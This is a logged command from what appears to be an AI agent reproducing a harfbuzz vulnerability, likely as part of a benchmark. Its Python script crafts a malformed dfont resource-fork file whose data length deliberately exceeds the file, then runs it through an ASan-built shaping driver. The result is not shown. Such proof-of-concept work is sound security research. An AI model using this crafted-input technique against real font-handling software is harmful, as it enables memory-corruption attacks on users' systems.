message:
Command `cd /workspace && python3 - <<'PY'
import struct, pathlib
font_path='/workspace/repo-vul/src-vul/harfbuzz/test/api/fonts/Roboto-Regular.abc.ttf'
font=pathlib.Path(font_path).read_bytes()
# choose map after font to avoid overlap? header map offset can be 16, map before data is okay. Use map at 16.
data_off=0x100
map_off=0x10
data_len=0xffffffff  # deliberately exceeds file
map_len=64
size=max(data_off+4+len(font), map_off+64)
b=bytearray(b'\0'*size)
# ResourceForkHeader
struct.pack_into('>IIII', b, 0, data_off, map_off, data_len, map_len)
# ResourceMap at 16. typeList offset=28, nameList=0
m=map_off
# reserved zero. At m+24 typeList offset, m+26 nameList
struct.pack_into('>HH', b, m+24, 28, 0)
# ArrayOfM1 lenM1 at m+28
struct.pack_into('>H', b, m+28, 0)
# ResourceTypeRecord at m+30: tag sfnt, resCountM1=0, resourcesZ=10 (from type_base m+28 to m+38)
struct.pack_into('>4sHH', b, m+30, b'sfnt', 0, 10)
# ResourceRecord at m+38: id=128, nameOffset=-1, attrs=0, offset 24-bit=0, reserved=0
struct.pack_into('>HhB', b, m+38, 128, -1, 0)
b[m+43:m+46]=(0).to_bytes(3,'big')
struct.pack_into('>I', b, m+46, 0)
# data block LArrayOf len and font at data_off
struct.pack_into('>I', b, data_off, len(font))
b[data_off+4:data_off+4+len(font)]=font
pathlib.Path('/workspace/poc1.dfont').write_bytes(b)
print(len(b), len(font))
PY
ASAN_OPTIONS=detect_leaks=0 /tmp/hb-shape-driver /workspace/poc1.dfont >/tmp/poc1.out 2>&1; echo exit:$?; head -80 /tmp/poc1.out` executed with exit code 0.
